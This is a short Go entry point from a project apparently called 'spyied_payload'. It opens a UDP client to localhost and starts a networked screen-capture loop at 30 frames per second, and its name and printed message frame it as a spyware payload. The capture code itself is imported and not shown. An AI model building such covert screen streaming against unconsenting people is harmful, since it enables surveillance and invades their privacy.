package main

import (
	"fmt"
	"spyied_payload/network"
	"spyied_payload/service/screen"
)

func main() {
	fmt.Println("This is a legendary beginning of a new Payload")
	network.InitUDPClient("127.0.0.1", 11000)

	var ssConf = screen.Config{
		TargetFPS:      30,
		DisplayIndex:   0,
		NetworkEnabled: true,
		BlockSize:      16,
	}

	var capturer = screen.InitCapturer(&ssConf)
	capturer.CaptureLoop()
}
